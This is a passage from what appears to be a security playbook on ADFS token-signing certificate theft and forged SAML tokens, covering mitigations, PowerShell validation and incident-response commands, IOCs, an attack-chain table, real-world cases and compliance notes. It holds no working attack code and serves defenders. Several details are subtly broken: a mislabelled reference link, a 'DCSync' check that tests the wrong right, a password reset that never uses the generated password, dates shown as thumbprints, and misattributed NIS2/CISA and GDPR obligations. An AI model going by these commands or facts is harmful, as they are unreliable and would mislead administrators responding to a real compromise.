  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. Name: `ADFS Admin - Compliant Devices Only`
  3. **Conditions:**
     - Users: ADFS administrators
     - Device state: **Require device to be marked as compliant**
  4. **Access controls:** Grant → **Require device to be marked as compliant**
  5. Enable and click **Create**

#### Validation Commands (Verify Mitigations)

```powershell
# Verify certificate rotations have occurred
Get-AdfsCertificate -CertificateType Token-Signing | Select-Object Thumbprint, IsPrimary

# Verify DKM container ACL is restricted
Get-Acl -Path "AD:\CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory,CN=Configuration,DC=company,DC=com" | Select-Object Access

# Verify ADFS audit logging is enabled
Get-EventLog -LogName "AD FS" -Newest 10 -ErrorAction SilentlyContinue | Select-Object TimeGenerated, Message

# Verify no users have DCSync rights except Domain Admins
Get-ADObject -SearchBase "CN=Configuration,DC=company,DC=com" -Filter * | ForEach-Object {
    $acl = Get-Acl -Path "AD:\$($_.DistinguishedName)"
    $acl.Access | Where-Object { $_.IdentityReference -notmatch "Domain Admins" -and $_.ActiveDirectoryRights -match "GenericAll" }
}
```

**Expected Output (If Secure):**
```
Thumbprint: 2023-01-15 (current)
Thumbprint: 2023-01-08 (previous)
IsPrimary: True (for newest cert)

(No non-admin DCSync rights found)
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Windows Event Logs:** Event ID 4662 (Directory Service Access to DKM container), Event ID 4768 (missing Kerberos TGT before SAML auth)
- **ADFS Logs:** Event 1200 (certificate configuration changes), Event 1202 (audit failures)
- **Network:** Unusual ADFS server outbound connections to non-Microsoft IPs
- **Artifacts:** Unexpected certificate thumbprints in ADFS config; decrypted .pfx files in temp directories

#### Forensic Artifacts

- **Cloud:** AuditLogs showing SAML-based sign-ins without MFA, from unexpected IPs, or to unexpected applications
- **On-Premises:** ADFS server registry changes, unauthorized PowerShell execution in event logs
- **Network:** Packet capture showing SOAP requests to ADFS for token-signing certificate queries

#### Response Procedures

1. **Immediate Isolation:** Rotate ADFS token-signing certificate twice in succession (see Mitigations)

   ```powershell
   # First rotation
   Add-AdfsCertificate -CertificateType Token-Signing -Thumbprint "<new_cert_thumbprint>"
   
   # Wait 30 minutes, then second rotation
   Start-Sleep -Seconds 1800
   Add-AdfsCertificate -CertificateType Token-Signing -Thumbprint "<newer_cert_thumbprint>"
   ```

2. **Collect Evidence:** Export ADFS audit logs and security event logs

   ```powershell
   # Export ADFS logs
   wevtutil.exe export-log "AD FS" C:\Evidence\ADFS.evtx /overwrite:true
   
   # Export Security logs for last 7 days
   Get-EventLog -LogName Security -After (Get-Date).AddDays(-7) | Export-Csv -Path C:\Evidence\Security.csv
   ```

3. **Investigate Token Usage:** Query Entra ID for SAML-based sign-ins during suspected compromise period

   ```powershell
   # Find all SAML-based sign-ins
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
     -Operations "Sign-in activity" `
     -ResultSize 10000 | Where-Object { $_.AuditData -contains "SAML" } | `
     Select-Object UserIds, AuditData | Export-Csv -Path C:\Evidence\SAMLSignins.csv
   ```

4. **Audit ADFS Server for Unauthorized Access:** Check for unusual service accounts or scheduled tasks that accessed the ADFS database

   ```powershell
   # Check for suspicious scheduled tasks
   Get-ScheduledTask -TaskPath "\*" | Where-Object { $_.Principal.UserId -eq "ADFS-Service-Account" }
   
   # Check recent WinRM logons
   Get-EventLog -LogName "Windows PowerShell" -After (Get-Date).AddDays(-7) | Select-Object TimeGenerated, Message
   ```

5. **Revoke Compromised Identities:** If attacker impersonated specific users, revoke their sessions and reset passwords

   ```powershell
   # Force sign-out of all sessions for compromised users
   Revoke-MgUserSignInSession -UserId "victim@company.com"
   
   # Reset password for compromised account
   $newPassword = -join ((33..126) | Get-Random -Count 32 | % {[char]$_})
   Update-MgUser -UserId "victim@company.com" -PasswordProfile @{ ForceChangePasswordNextSignIn = $true }
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002] BDC Deserialization Vulnerability | Attacker gains access to on-premises infrastructure |
| **2** | **Privilege Escalation** | [PE-VALID-006] DSRM Backdoor | Escalate to Domain Admin to obtain DCSync rights |
| **3** | **Credential Access** | **[CA-FORGE-002]** | **Steal ADFS certificate and forge SAML tokens** |
| **4** | **Lateral Movement** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Escalate to Entra ID Global Admin via forged token |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Collection via EWS | Exfiltrate sensitive data as impersonated global admin |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: SolarWinds Sunburst / UNC2452 (2020)
- **Target:** U.S. Government agencies, Fortune 500 companies
- **Timeline:** December 2020
- **Technique Status:** Attackers stole ADFS token-signing certificate and created forged SAML tokens to access Exchange Online, SharePoint, and other M365 services as any user, including Global Administrators
- **Impact:** 18,000+ organizations compromised; government agencies, utilities, and telecom companies suffered full tenant takeover
- **Reference:** [Microsoft SolarWinds Customer Guidance](https://www.microsoft.com/en-us/security/blog/2021/01/20/new-powerful-credentials-discovered-for-conti-ransomware-operations/)

#### Example 2: Google Cloud Blog - ADFS Replication Attack (2024)
- **Target:** Enterprise environments with AD FS deployed
- **Timeline:** Demonstrated March 2024
- **Technique Status:** Researchers showed how to extract ADFS certificate remotely via Policy Store Transfer Service (similar to DCSync) without requiring local ADFS server access
- **Impact:** Certificate extraction from anywhere on the network; significant expansion of attack surface
- **Reference:** [Google Cloud Blog - Abusing ADFS Replication](https://cloud.google.com/blog/topics/threat-intelligence/abusing-replication-stealing-adfs-secrets-over-the-network/)

---

## 15. COMPLIANCE & AUDIT NOTES

**Data Sources Required:**
- ADFS Event Logs (Admin, Operational, Debug)
- Windows Security Event Log (Event IDs 4768, 4769, 4662)
- AuditLogs from Entra ID (Sign-in activity, Certificate changes)
- Microsoft Purview Unified Audit Log

**Retention Policy:**
- Keep ADFS logs for minimum **90 days** (CIS Benchmark requirement)
- Implement **1-year retention** for sensitive authentication events
- Archive to Azure Blob Storage for long-term forensic retention

**Incident Reporting:**
- If compromise confirmed: Notify affected users within **72 hours** (GDPR Art. 33)
- Report to **CISA** within **72 hours** (NIS2 Art. 21)
- Notify **National Data Protection Authority** (country-specific, typically EU)
- Document all forged tokens identified and legitimate systems accessed
